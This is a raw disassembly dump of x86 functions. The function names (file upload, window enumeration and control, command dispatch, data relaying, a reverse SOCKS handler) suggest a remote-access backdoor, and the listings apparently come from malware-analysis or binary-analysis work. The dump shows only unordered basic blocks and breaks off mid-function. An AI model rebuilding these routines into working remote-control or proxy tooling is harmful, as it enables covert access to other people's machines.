0x805322c:	push	eax
0x805322d:	push	0
0x805322f:	mov	eax, dword ptr [esp + 0x1d48]
0x8053236:	push	dword ptr [eax + 0x2018]
0x805323c:	push	ebx
0x805323d:	call	0x804bc90
None
|
|
|
v
0x80534a4:	push	dword ptr [eax + 0x200c]
0x80534aa:	call	0x804e62a
None
|
|
|
v
0x80531d5:	push	edi
0x80531d6:	push	edi
0x80531d7:	push	0x80565c8
0x80531dc:	push	dword ptr [esp + 0x1d4c]
0x80531e3:	call	0x804bca0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:FileUploadWrite
TOTAL BLOCKS :8
0x805363c:	pop	edx
0x805363d:	test	al, al
0x805363f:	je	0x805365e
None
|
|
|
v
0x8053623:	push	edi
0x8053624:	push	esi
0x8053625:	push	ebx
0x8053626:	sub	esp, 0x10
0x8053629:	mov	esi, dword ptr [esp + 0x24]
0x805362d:	mov	al, byte ptr [esi]
0x805362f:	movzx	edi, al
0x8053632:	mov	byte ptr [esp + 0xf], al
0x8053636:	push	edi
0x8053637:	call	0x805314d
None
|
|
|
v
0x8053641:	mov	ebx, dword ptr [esp + 0x28]
0x8053645:	inc	esi
0x8053646:	push	dword ptr [edi*4 + 0x805ba18]
0x805364d:	dec	ebx
0x805364e:	push	ebx
0x805364f:	push	1
0x8053651:	push	esi
0x8053652:	call	0x804bcb0
None
|
|
|
v
0x805367d:	add	esp, 0x10
0x8053680:	add	esp, 0x10
0x8053683:	pop	ebx
0x8053684:	pop	esi
0x8053685:	pop	edi
0x8053686:	ret	
None
|
|
|
v
0x8053680:	add	esp, 0x10
0x8053683:	pop	ebx
0x8053684:	pop	esi
0x8053685:	pop	edi
0x8053686:	ret	
None
|
|
|
v
0x805365e:	push	1
0x8053660:	lea	eax, dword ptr [esp + 0x13]
0x8053664:	push	eax
0x8053665:	push	0x13
0x8053667:	push	dword ptr [esp + 0x2c]
0x805366b:	call	0x804e62a
None
|
|
|
v
0x8053670:	movzx	eax, byte ptr [esp + 0x1f]
0x8053675:	mov	dword ptr [esp], eax
0x8053678:	call	0x80530f6
None
|
|
|
v
0x8053657:	add	esp, 0x10
0x805365a:	cmp	eax, ebx
0x805365c:	je	0x8053680
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:EnumerateWindows
TOTAL BLOCKS :20
0x8053773:	add	esp, 0x3c
0x8053776:	pop	ebx
0x8053777:	pop	esi
0x8053778:	pop	edi
0x8053779:	pop	ebp
0x805377a:	ret	
None
|
|
|
v
0x805375d:	cmp	ebp, dword ptr [esp + 0x24]
0x8053761:	jb	0x805374a
None
|
|
|
v
0x8053770:	add	esp, 0x10
0x8053773:	add	esp, 0x3c
0x8053776:	pop	ebx
0x8053777:	pop	esi
0x8053778:	pop	edi
0x8053779:	pop	ebp
0x805377a:	ret	
None
|
|
|
v
0x80536c6:	cmp	dword ptr [esp + 0x18], 0
0x80536cb:	je	0x805371d
None
|
|
|
v
0x8053745:	xor	ebp, ebp
0x8053747:	inc	edi
0x8053748:	jmp	0x805375d
None
|
|
|
v
0x8053763:	sub	esp, 0xc
0x8053766:	push	dword ptr [esp + 0x28]
0x805376a:	call	dword ptr [0x805be2c]
None
|
|
|
v
0x805374a:	push	esi
0x805374b:	push	edi
0x805374c:	mov	eax, dword ptr [esp + 0x24]
0x8053750:	push	dword ptr [eax + ebp*4]
0x8053753:	inc	ebp
0x8053754:	push	ebx
0x8053755:	call	0x8053688
None
|
|
|
v
0x8053715:	mov	eax, dword ptr [esp + 0x28]
0x8053719:	mov	dword ptr [esi], eax
0x805371b:	jmp	0x8053773
None
|
|
|
v
0x80536be:	mov	eax, dword ptr [esp + 0xc]
0x80536c2:	test	eax, eax
0x80536c4:	je	0x805371d
None
|
|
|
v
0x805375a:	add	esp, 0x10
0x805375d:	cmp	ebp, dword ptr [esp + 0x24]
0x8053761:	jb	0x805374a
None
|
|
|
v
0x805371d:	push	eax
0x805371e:	push	eax
0x805371f:	lea	eax, dword ptr [esp + 0x2c]
0x8053723:	push	eax
0x8053724:	lea	eax, dword ptr [esp + 0x28]
0x8053728:	push	eax
0x8053729:	lea	eax, dword ptr [esp + 0x30]
0x805372d:	push	eax
0x805372e:	lea	eax, dword ptr [esp + 0x68]
0x8053732:	push	eax
0x8053733:	push	dword ptr [esp + 0x6c]
0x8053737:	push	ebx
0x8053738:	call	dword ptr [0x805be48]
None
|
|
|
v
0x80536cd:	mov	edx, dword ptr [esi]
0x80536cf:	mov	dword ptr [esp + 0x2c], 0
0x80536d7:	mov	dword ptr [esp + 0x28], edx
0x80536db:	sub	esp, 0xc
0x80536de:	push	dword ptr [esp + 0x60]
0x80536e2:	push	eax
0x80536e3:	push	0x8056522
0x80536e8:	push	1
0x80536ea:	lea	ebx, dword ptr [esp + 0x48]
0x80536ee:	push	ebx
0x80536ef:	call	0x804bd20
None
|
|
|
v
0x805370e:	mov	dword ptr [esp + 0x48], eax
0x8053712:	add	esp, 0x20
0x8053715:	mov	eax, dword ptr [esp + 0x28]
0x8053719:	mov	dword ptr [esi], eax
0x805371b:	jmp	0x8053773
None
|
|
|
v
0x80536f4:	add	esp, 0x20
0x80536f7:	inc	eax
0x80536f8:	je	0x8053715
None
|
|
|
v
0x8053688:	push	ebp
0x8053689:	push	edi
0x805368a:	push	esi
0x805368b:	push	ebx
0x805368c:	sub	esp, 0x3c
0x805368f:	mov	edi, dword ptr [esp + 0x58]
0x8053693:	mov	ebx, dword ptr [esp + 0x50]
0x8053697:	mov	esi, dword ptr [esp + 0x5c]
0x805369b:	cmp	edi, 2
0x805369e:	jg	0x8053773
None
|
|
|
v
0x80536a4:	jne	0x805371d
None
|
|
|
v
0x80536a6:	push	edx
0x80536a7:	lea	eax, dword ptr [esp + 0x10]
0x80536ab:	push	eax
0x80536ac:	push	dword ptr [esp + 0x5c]
0x80536b0:	push	ebx
0x80536b1:	call	dword ptr [0x805be28]
None
|
|
|
v
0x805373e:	add	esp, 0x20
0x8053741:	test	eax, eax
0x8053743:	je	0x8053773
None
|
|
|
v
0x80536b7:	add	esp, 0x10
0x80536ba:	test	eax, eax
0x80536bc:	je	0x805371d
None
|
|
|
v
0x80536fa:	sub	esp, 0xc
0x80536fd:	push	1
0x80536ff:	push	-1
0x8053701:	push	ebx
0x8053702:	push	-1
0x8053704:	lea	eax, dword ptr [esp + 0x44]
0x8053708:	push	eax
0x8053709:	call	0x8051f2f
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ListWindows
TOTAL BLOCKS :9
0x80537d0:	pop	ecx
0x80537d1:	lea	eax, dword ptr [esp + 0x14]
0x80537d5:	push	eax
0x80537d6:	call	0x804f57c
None
|
|
|
v
0x805379f:	lea	edx, dword ptr [esp + 8]
0x80537a3:	push	edx
0x80537a4:	push	0
0x80537a6:	imul	edx, dword ptr [eax + 0x84], 0x50
0x80537ad:	add	edx, dword ptr [eax + 0x8c]
0x80537b3:	push	dword ptr [edx + 8]
0x80537b6:	push	eax
0x80537b7:	call	0x8053688
None
|
|
|
v
0x805377b:	sub	esp, 0x28
0x805377e:	lea	eax, dword ptr [esp + 0x18]
0x8053782:	mov	dword ptr [esp + 0x14], 0
0x805378a:	push	eax
0x805378b:	call	0x80558b7
None
|
|
|
v
0x8053797:	mov	eax, dword ptr [esp + 0xc]
0x805379b:	test	eax, eax
0x805379d:	je	0x80537bf
None
|
|
|
v
0x80537bf:	push	-1
0x80537c1:	push	dword ptr [esp + 0xc]
0x80537c5:	push	0x27
0x80537c7:	push	dword ptr [esp + 0x2c]
0x80537cb:	call	0x804e62a
None
|
|
|
v
0x80537db:	add	esp, 0x10
0x80537de:	add	esp, 0x1c
0x80537e1:	ret	
None
|
|
|
v
0x80537bc:	add	esp, 0x10
0x80537bf:	push	-1
0x80537c1:	push	dword ptr [esp + 0xc]
0x80537c5:	push	0x27
0x80537c7:	push	dword ptr [esp + 0x2c]
0x80537cb:	call	0x804e62a
None
|
|
|
v
0x80537de:	add	esp, 0x1c
0x80537e1:	ret	
None
|
|
|
v
0x8053790:	add	esp, 0x10
0x8053793:	test	al, al
0x8053795:	je	0x80537de
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:WindowOperation
TOTAL BLOCKS :15
0x80537ff:	add	esp, 0x10
0x8053802:	test	al, al
0x8053804:	je	0x80538d7
None
|
|
|
v
0x80537e2:	push	esi
0x80537e3:	push	ebx
0x80537e4:	add	esp, -0x80
0x80537e7:	lea	eax, dword ptr [esp + 0x78]
0x80537eb:	mov	ebx, dword ptr [esp + 0x8c]
0x80537f2:	mov	esi, dword ptr [esp + 0x90]
0x80537f9:	push	eax
0x80537fa:	call	0x80558b7
None
|
|
|
v
0x8053867:	mov	dword ptr [esp + 0x2c], ebx
0x805386b:	mov	dword ptr [esp + 0x34], 0x20
0x8053873:	mov	dword ptr [esp + 0x38], 0
0x805387b:	mov	dword ptr [esp + 0x30], eax
0x805387f:	mov	eax, dword ptr [esp + 0x7c]
0x8053883:	mov	dword ptr [esp + 0x3c], 0
0x805388b:	mov	dword ptr [esp + 0x40], 0
0x8053893:	mov	dword ptr [esp + 0x44], 0
0x805389b:	mov	dword ptr [esp + 0x48], 0
0x80538a3:	pop	edx
0x80538a4:	lea	edx, dword ptr [esp + 0x18]
0x80538a8:	push	edx
0x80538a9:	push	0x180000
0x80538ae:	push	0
0x80538b0:	imul	edx, dword ptr [eax + 0x84], 0x50
0x80538b7:	add	edx, dword ptr [eax + 0x8c]
0x80538bd:	push	dword ptr [edx + 8]
0x80538c0:	push	eax
0x80538c1:	call	dword ptr [0x805be3c]
None
|
|
|
v
0x8053828:	jmp	0x8053837
None
|
|
|
v
0x80538ca:	push	dword ptr [esp + 0x78]
0x80538ce:	call	dword ptr [0x805be1c]
None
|
|
|
v
0x805382a:	push	esi
0x805382b:	push	esi
0x805382c:	push	ebx
0x805382d:	push	dword ptr [esp + 0x78]
0x8053831:	call	dword ptr [0x805be50]
None
|
|
|
v
0x80538c7:	add	esp, 0x14
0x80538ca:	push	dword ptr [esp + 0x78]
0x80538ce:	call	dword ptr [0x805be1c]
None
|
|
|
v
0x805383d:	mov	dword ptr [esp + 0xc], 0x21
0x8053845:	mov	dword ptr [esp + 0x10], 0
0x805384d:	mov	dword ptr [esp + 0x14], 1
0x8053855:	push	esi
0x8053856:	push	0
0x8053858:	push	0x80565ee
0x805385d:	push	dword ptr [esp + 0x78]
0x8053861:	call	dword ptr [0x805be58]
None
|
|
|
v
0x805380a:	cmp	esi, 2
0x805380d:	je	0x805382a
None
|
|
|
v
0x805381b:	push	eax
0x805381c:	push	eax
0x805381d:	push	ebx
0x805381e:	push	dword ptr [esp + 0x78]
0x8053822:	call	dword ptr [0x805be78]
None
|
|
|
v
0x8053814:	dec	esi
0x8053815:	jne	0x80538d7
None
|
|
|
v
0x80538d4:	add	esp, 0x10
0x80538d7:	add	esp, 0x74
0x80538da:	pop	ebx
0x80538db:	pop	esi
0x80538dc:	ret	
None
|
|
|
v
0x80538d7:	add	esp, 0x74
0x80538da:	pop	ebx
0x80538db:	pop	esi
0x80538dc:	ret	
None
|
|
|
v
0x805380f:	cmp	esi, 3
0x8053812:	je	0x805383d
None
|
|
|
v
0x8053837:	pop	ecx
0x8053838:	jmp	0x80538ca
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ChangeWindowTitle
TOTAL BLOCKS :15
0x80539b3:	add	esp, 0x2c
0x80539b6:	pop	ebx
0x80539b7:	pop	esi
0x80539b8:	pop	edi
0x80539b9:	pop	ebp
0x80539ba:	ret	
None
|
|
|
v
0x805397b:	add	esp, 0xc
0x805397e:	push	0
0x8053980:	push	0x8056619
0x8053985:	push	dword ptr [esp + 0x28]
0x8053989:	mov	edi, eax
0x805398b:	call	dword ptr [0x805be58]
None
|
|
|
v
0x80539b0:	add	esp, 0x10
0x80539b3:	add	esp, 0x2c
0x80539b6:	pop	ebx
0x80539b7:	pop	esi
0x80539b8:	pop	edi
0x80539b9:	pop	ebp
0x80539ba:	ret	
None
|
|
|
v
0x805395a:	mov	ebp, dword ptr [0x805be54]
0x8053960:	not	ecx
0x8053962:	dec	ecx
0x8053963:	mov	dword ptr [esp + 0x3c], ecx
0x8053967:	add	esp, 0x2c
0x805396a:	push	0
0x805396c:	push	0x8056600
0x8053971:	push	dword ptr [esp + 0x28]
0x8053975:	call	dword ptr [0x805be58]
None
|
|
|
v
0x80539a3:	add	esp, 0x24
0x80539a6:	push	dword ptr [esp + 0x28]
0x80539aa:	call	dword ptr [0x805be1c]
None
|
|
|
v
0x8053953:	xor	eax, eax
0x8053955:	or	ecx, 0xffffffff
0x8053958:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8053929:	add	esp, 0xc
0x805392c:	push	0
0x805392e:	push	0x805660c
0x8053933:	push	dword ptr [esp + 0x28]
0x8053937:	mov	edi, eax
0x8053939:	call	dword ptr [0x805be58]
None
|
|
|
v
0x8053901:	xor	eax, eax
0x8053903:	mov	edi, ebx
0x8053905:	mov	ebp, dword ptr [0x805be54]
0x805390b:	or	ecx, 0xffffffff
0x805390e:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8053910:	not	ecx
0x8053912:	dec	ecx
0x8053913:	mov	dword ptr [esp + 0xc], ecx
0x8053917:	push	eax
0x8053918:	push	0
0x805391a:	push	0x8056600
0x805391f:	push	dword ptr [esp + 0x28]
0x8053923:	call	dword ptr [0x805be58]
None
|
|
|
v
0x8053958:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80538f6:	add	esp, 0x10
0x80538f9:	test	al, al
0x80538fb:	je	0x80539b3
None
|
|
|
v
0x80538dd:	push	ebp
0x80538de:	push	edi
0x80538df:	push	esi
0x80538e0:	push	ebx
0x80538e1:	sub	esp, 0x38
0x80538e4:	lea	eax, dword ptr [esp + 0x28]
0x80538e8:	mov	esi, dword ptr [esp + 0x4c]
0x80538ec:	mov	ebx, dword ptr [esp + 0x50]
0x80538f0:	push	eax
0x80538f1:	call	0x80558b7
None
|
|
|
v
0x805390e:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8053991:	push	dword ptr [esp + 0x1c]
0x8053995:	push	ebx
0x8053996:	push	0
0x8053998:	push	8
0x805399a:	push	edi
0x805399b:	push	eax
0x805399c:	push	esi
0x805399d:	push	dword ptr [esp + 0x48]
0x80539a1:	call	ebp
None
|
|
|
v
0x805393f:	push	dword ptr [esp + 0x1c]
0x8053943:	push	ebx
0x8053944:	push	0
0x8053946:	push	8
0x8053948:	push	edi
0x8053949:	mov	edi, ebx
0x805394b:	push	eax
0x805394c:	push	esi
0x805394d:	push	dword ptr [esp + 0x48]
0x8053951:	call	ebp
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ProcessWindowCommand
TOTAL BLOCKS :21
0x8053a34:	add	esp, 0x14
0x8053a37:	push	0x100
0x8053a3c:	lea	esi, dword ptr [esp + 0x10]
0x8053a40:	push	esi
0x8053a41:	push	2
0x8053a43:	push	7
0x8053a45:	push	ebx
0x8053a46:	call	0x80521a4
None
|
|
|
v
0x80539de:	jmp	0x8053a08
None
|
|
|
v
0x80539e8:	jmp	0x8053a1d
None
|
|
|
v
0x80539f3:	pop	ecx
0x80539f4:	pop	ebx
0x80539f5:	push	1
0x80539f7:	jmp	0x8053a15
None
|
|
|
v
0x8053a11:	pop	ebx
0x8053a12:	pop	esi
0x8053a13:	push	3
0x8053a15:	push	eax
0x8053a16:	call	0x80537e2
None
|
|
|
v
0x80539d4:	jg	0x80539e0
None
|
|
|
v
0x80539bb:	push	edi
0x80539bc:	push	esi
0x80539bd:	push	ebx
0x80539be:	sub	esp, 0x110
0x80539c4:	mov	eax, dword ptr [esp + 0x120]
0x80539cb:	lea	ebx, dword ptr [eax + 1]
0x80539ce:	mov	al, byte ptr [eax]
0x80539d0:	cmp	al, 2
0x80539d2:	je	0x80539ea
None
|
|
|
v
0x8053a08:	sub	esp, 0xc
0x8053a0b:	push	ebx
0x8053a0c:	call	0x8051de0
None
|
|
|
v
0x8053a54:	pop	edx
0x8053a55:	pop	ecx
0x8053a56:	push	esi
0x8053a57:	push	eax
0x8053a58:	call	0x80538dd
None
|
|
|
v
0x8053a02:	pop	edi
0x8053a03:	pop	edx
0x8053a04:	push	2
0x8053a06:	jmp	0x8053a15
None
|
|
|
v
0x8053a1d:	sub	esp, 0xc
0x8053a20:	push	0x10
0x8053a22:	lea	edi, dword ptr [esp + 0x110]
0x8053a29:	push	edi
0x8053a2a:	push	1
0x8053a2c:	push	7
0x8053a2e:	push	ebx
0x8053a2f:	call	0x80521a4
None
|
|
|
v
0x80539d6:	dec	al
0x80539d8:	jne	0x8053a60
None
|
|
|
v
0x8053a5d:	add	esp, 0x10
0x8053a60:	add	esp, 0x110
0x8053a66:	pop	ebx
0x8053a67:	pop	esi
0x8053a68:	pop	edi
0x8053a69:	ret	
None
|
|
|
v
0x80539e0:	cmp	al, 3
0x80539e2:	je	0x80539f9
None
|
|
|
v
0x8053a15:	push	eax
0x8053a16:	call	0x80537e2
None
|
|
|
v
0x8053a4b:	add	esp, 0x14
0x8053a4e:	push	edi
0x8053a4f:	call	0x8051de0
None
|
|
|
v
0x8053a1b:	jmp	0x8053a5d
None
|
|
|
v
0x80539e4:	cmp	al, 4
0x80539e6:	jne	0x8053a60
None
|
|
|
v
0x80539f9:	sub	esp, 0xc
0x80539fc:	push	ebx
0x80539fd:	call	0x8051de0
None
|
|
|
v
0x80539ea:	sub	esp, 0xc
0x80539ed:	push	ebx
0x80539ee:	call	0x8051de0
None
|
|
|
v
0x8053a60:	add	esp, 0x110
0x8053a66:	pop	ebx
0x8053a67:	pop	esi
0x8053a68:	pop	edi
0x8053a69:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:RelayData
TOTAL BLOCKS :18
0x8053b58:	add	esp, 0x10
0x8053b5b:	test	eax, eax
0x8053b5d:	mov	edi, eax
0x8053b5f:	jle	0x8053bb3
None
|
|
|
v
0x8053afa:	mov	eax, dword ptr [esp + 0xc]
0x8053afe:	mov	ecx, dword ptr [esp + 0x10]
0x8053b02:	mov	edx, dword ptr [esp + 0x18]
0x8053b06:	or	dword ptr [esp + eax*4 + 0x1030], edx
0x8053b0d:	mov	eax, dword ptr [esp + 0x1c]
0x8053b11:	or	dword ptr [esp + ecx*4 + 0x1030], eax
0x8053b18:	sub	esp, 0xc
0x8053b1b:	push	0
0x8053b1d:	push	0
0x8053b1f:	push	0
0x8053b21:	lea	edx, dword ptr [esp + 0x1048]
0x8053b28:	push	edx
0x8053b29:	push	dword ptr [esp + 0x30]
0x8053b2d:	call	0x804bc00
None
|
|
|
v
0x8053b87:	push	0
0x8053b89:	push	0x1000
0x8053b8e:	push	ebx
0x8053b8f:	push	ebp
0x8053b90:	call	0x804bfa0
None
|
|
|
v
0x8053a8c:	inc	eax
0x8053a8d:	mov	ebx, 1
0x8053a92:	mov	dword ptr [esp + 0x14], eax
0x8053a96:	mov	eax, esi
0x8053a98:	mov	ecx, esi
0x8053a9a:	shr	eax, 5
0x8053a9d:	mov	edx, ebp
0x8053a9f:	mov	dword ptr [esp + 0xc], eax
0x8053aa3:	mov	eax, ebx
0x8053aa5:	mov	edi, 0x20
0x8053aaa:	shl	eax, cl
0x8053aac:	mov	ecx, ebp
0x8053aae:	mov	dword ptr [esp + 0x18], eax
0x8053ab2:	mov	eax, ebx
0x8053ab4:	shl	eax, cl
0x8053ab6:	shr	edx, 5
0x8053ab9:	mov	dword ptr [esp + 0x1c], eax
0x8053abd:	mov	eax, esi
0x8053abf:	mov	dword ptr [esp + 0x10], edx
0x8053ac3:	cdq	
0x8053ac4:	idiv	edi
0x8053ac6:	mov	cl, dl
0x8053ac8:	mov	dword ptr [esp + 0x28], eax
0x8053acc:	mov	eax, ebx
0x8053ace:	shl	eax, cl
0x8053ad0:	mov	dword ptr [esp + 0x20], eax
0x8053ad4:	mov	eax, ebp
0x8053ad6:	cdq	
0x8053ad7:	idiv	edi
0x8053ad9:	mov	cl, dl
0x8053adb:	shl	ebx, cl
0x8053add:	mov	dword ptr [esp + 0x24], ebx
0x8053ae1:	lea	ebx, dword ptr [esp + 0x30]
0x8053ae5:	mov	dword ptr [esp + 0x2c], eax
0x8053ae9:	mov	ecx, 0x20
0x8053aee:	xor	eax, eax
0x8053af0:	lea	edi, dword ptr [esp + 0x1030]
0x8053af7:	cld	
0x8053af8:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8053b6b:	add	esp, 0x10
0x8053b6e:	cmp	eax, edi
0x8053b70:	jne	0x8053bb3
None
|
|
|
v
0x8053a8a:	mov	eax, ebp
0x8053a8c:	inc	eax
0x8053a8d:	mov	ebx, 1
0x8053a92:	mov	dword ptr [esp + 0x14], eax
0x8053a96:	mov	eax, esi
0x8053a98:	mov	ecx, esi
0x8053a9a:	shr	eax, 5
0x8053a9d:	mov	edx, ebp
0x8053a9f:	mov	dword ptr [esp + 0xc], eax
0x8053aa3:	mov	eax, ebx
0x8053aa5:	mov	edi, 0x20
0x8053aaa:	shl	eax, cl
0x8053aac:	mov	ecx, ebp
0x8053aae:	mov	dword ptr [esp + 0x18], eax
0x8053ab2:	mov	eax, ebx
0x8053ab4:	shl	eax, cl
0x8053ab6:	shr	edx, 5
0x8053ab9:	mov	dword ptr [esp + 0x1c], eax
0x8053abd:	mov	eax, esi
0x8053abf:	mov	dword ptr [esp + 0x10], edx
0x8053ac3:	cdq	
0x8053ac4:	idiv	edi
0x8053ac6:	mov	cl, dl
0x8053ac8:	mov	dword ptr [esp + 0x28], eax
0x8053acc:	mov	eax, ebx
0x8053ace:	shl	eax, cl
0x8053ad0:	mov	dword ptr [esp + 0x20], eax
0x8053ad4:	mov	eax, ebp
0x8053ad6:	cdq	
0x8053ad7:	idiv	edi
0x8053ad9:	mov	cl, dl
0x8053adb:	shl	ebx, cl
0x8053add:	mov	dword ptr [esp + 0x24], ebx
0x8053ae1:	lea	ebx, dword ptr [esp + 0x30]
0x8053ae5:	mov	dword ptr [esp + 0x2c], eax
0x8053ae9:	mov	ecx, 0x20
0x8053aee:	xor	eax, eax
0x8053af0:	lea	edi, dword ptr [esp + 0x1030]
0x8053af7:	cld	
0x8053af8:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8053ba8:	add	esp, 0x10
0x8053bab:	cmp	eax, edi
0x8053bad:	je	0x8053ae9
None
|
|
|
v
0x8053b39:	mov	eax, dword ptr [esp + 0x28]
0x8053b3d:	mov	edx, dword ptr [esp + 0x20]
0x8053b41:	test	dword ptr [esp + eax*4 + 0x1030], edx
0x8053b48:	je	0x8053b72
None
|
|
|
v
0x8053b32:	add	esp, 0x20
0x8053b35:	test	eax, eax
0x8053b37:	jle	0x8053bb3
None
|
|
|
v
0x8053b95:	add	esp, 0x10
0x8053b98:	test	eax, eax
0x8053b9a:	mov	edi, eax
0x8053b9c:	jle	0x8053bb3
None
|
|
|
v
0x8053b9e:	push	0
0x8053ba0:	push	eax
0x8053ba1:	push	ebx
0x8053ba2:	push	esi
0x8053ba3:	call	0x804bfe0
None
|
|
|
v
0x8053b4a:	push	0
0x8053b4c:	push	0x1000
0x8053b51:	push	ebx
0x8053b52:	push	esi
0x8053b53:	call	0x804bfa0
None
|
|
|
v
0x8053ae9:	mov	ecx, 0x20
0x8053aee:	xor	eax, eax
0x8053af0:	lea	edi, dword ptr [esp + 0x1030]
0x8053af7:	cld	
0x8053af8:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8053af8:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8053b61:	push	0
0x8053b63:	push	eax
0x8053b64:	push	ebx
0x8053b65:	push	ebp
0x8053b66:	call	0x804bfe0
None
|
|
|
v
0x8053b72:	mov	eax, dword ptr [esp + 0x2c]
0x8053b76:	mov	edx, dword ptr [esp + 0x24]
0x8053b7a:	test	dword ptr [esp + eax*4 + 0x1030], edx
0x8053b81:	je	0x8053ae9
None
|
|
|
v
0x8053bb3:	add	esp, 0x10bc
0x8053bb9:	pop	ebx
0x8053bba:	pop	esi
0x8053bbb:	pop	edi
0x8053bbc:	pop	ebp
0x8053bbd:	ret	
None
|
|
|
v
0x8053a6c:	push	ebp
0x8053a6d:	push	edi
0x8053a6e:	push	esi
0x8053a6f:	push	ebx
0x8053a70:	sub	esp, 0x10bc
0x8053a76:	mov	esi, dword ptr [esp + 0x10d4]
0x8053a7d:	mov	ebp, dword ptr [esp + 0x10d0]
0x8053a84:	mov	eax, esi
0x8053a86:	cmp	esi, ebp
0x8053a88:	jge	0x8053a8c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SendResponse
TOTAL BLOCKS :2
0x8053bdb:	dec	eax
0x8053bdc:	sete	al
0x8053bdf:	add	esp, 0x2c
0x8053be2:	ret	
None
|
|
|
v
0x8053bbe:	sub	esp, 0x1c
0x8053bc1:	mov	eax, dword ptr [esp + 0x24]
0x8053bc5:	mov	byte ptr [esp + 0xc], al
0x8053bc9:	push	0
0x8053bcb:	push	1
0x8053bcd:	lea	eax, dword ptr [esp + 0x14]
0x8053bd1:	push	eax
0x8053bd2:	push	dword ptr [esp + 0x2c]
0x8053bd6:	call	0x804bfe0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:HandleReverseSocks
TOTAL BLOCKS :35
0x8053cfa:	push	0
0x8053cfc:	push	0x100
0x8053d01:	push	esi
0x8053d02:	push	dword ptr [ebx]
0x8053d04:	call	0x804bfa0
None
|
|
|
v
0x8053d6d:	push	eax
0x8053d6e:	push	0
0x8053d70:	push	1
0x8053d72:	push	2
0x8053d74:	call	0x804bf10
None
|
|
|
v
0x8053cf6:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8053c82:	push	0
0x8053c84:	push	4
0x8053c86:	lea	eax, dword ptr [esp + 0x234]
0x8053c8d:	push	eax
0x8053c8e:	push	ecx
0x8053c8f:	call	0x804bfa0
None
|
|
|
v
0x8053d67:	push	eax
0x8053d68:	push	eax
0x8053d69:	push	1
0x8053d6b:	jmp	0x8053d8c
None
|
|
|
v
0x8053c60:	add	esp, 0x20
0x8053c63:	test	eax, eax
0x8053c65:	jle	0x8053de5
None
|
|
|
v
0x8053d60:	add	esp, 0x10
0x8053d63:	test	al, al
0x8053d65:	jne	0x8053d6d
None
|
|
|
v
0x8053d79:	mov	dword ptr [esp + 0x238], eax
0x8053d80:	add	esp, 0x10
0x8053d83:	cmp	eax, 0xff
0x8053d86:	jne	0x8053d95
None
|
|
|
v
0x8053dd4:	pop	edx
0x8053dd5:	lea	eax, dword ptr [esp + 0x234]
0x8053ddc:	push	eax
0x8053ddd:	call	0x804e827
None
|
|
|
v
0x8053d14:	sub	esp, 0xc
0x8053d17:	push	0x80
0x8053d1c:	lea	edi, dword ptr [esp + 0x198]
0x8053d23:	push	edi
0x8053d24:	push	1
0x8053d26:	push	7
0x8053d28:	push	esi
0x8053d29:	call	0x80521a4
None
|
|
|
v
0x8053de5:	add	esp, 0x23c
0x8053deb:	pop	ebx
0x8053dec:	pop	esi
0x8053ded:	pop	edi
0x8053dee:	pop	ebp
0x8053def:	ret	
None
|
|
|
v
0x8053c35:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8053cb9:	add	esp, 0x10
0x8053cbc:	cmp	eax, 6
0x8053cbf:	jne	0x8053de5
None
|
|
|
v
0x8053cc5:	mov	eax, dword ptr [esp + 8]
0x8053cc9:	lea	edx, dword ptr [esp + 0x210]
0x8053cd0:	mov	ecx, 2
0x8053cd5:	mov	edi, edx
0x8053cd7:	mov	word ptr [esp + 0x208], 2
0x8053ce1:	mov	word ptr [esp + 0x20a], ax
0x8053ce9:	mov	eax, dword ptr [esp + 0xa]
0x8053ced:	mov	dword ptr [esp + 0x20c], eax
0x8053cf4:	mov	eax, ebp
0x8053cf6:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8053d09:	add	esp, 0x10
0x8053d0c:	test	eax, eax
0x8053d0e:	jle	0x8053de5
None
|
|
|
v
0x8053cf8:	jmp	0x8053d6d
None
|
|
|
v
0x8053de2:	add	esp, 0x10
0x8053de5:	add	esp, 0x23c
0x8053deb:	pop	ebx
0x8053dec:	pop	esi
0x8053ded:	pop	edi
0x8053dee:	pop	ebp
0x8053def:	ret	
None
|
|
|
v
0x8053d8c:	push	dword ptr [ebx]
0x8053d8e:	call	0x8053bbe
None
|
|
|
v
0x8053d45:	add	esp, 0x14
0x8053d48:	push	ebp
0x8053d49:	call	0x8051de0
None
|
|
|
v
0x8053cad:	push	0
0x8053caf:	push	6
0x8053cb1:	push	esi
0x8053cb2:	push	dword ptr [ebx]
0x8053cb4:	call	0x804bfa0
None
|
|
|
v
0x8053d88:	push	eax
0x8053d89:	push	eax
0x8053d8a:	push	2
0x8053d8c:	push	dword ptr [ebx]
0x8053d8e:	call	0x8053bbe
None
|
|
|
v
0x8053be3:	push	ebp
0x8053be4:	xor	ebp, ebp
0x8053be6:	push	edi
0x8053be7:	mov	eax, ebp
0x8053be9:	push	esi
0x8053bea:	mov	esi, 0x20
0x8053bef:	push	ebx
0x8053bf0:	mov	ecx, esi
0x8053bf2:	sub	esp, 0x23c
0x8053bf8:	lea	edx, dword ptr [esp + 0x108]
0x8053bff:	mov	ebx, dword ptr [esp + 0x250]
0x8053c06:	mov	dword ptr [esp + 0x228], 0xffffffff
0x8053c11:	mov	edi, edx
0x8053c13:	mov	dword ptr [esp + 0x22c], 0xffffffff
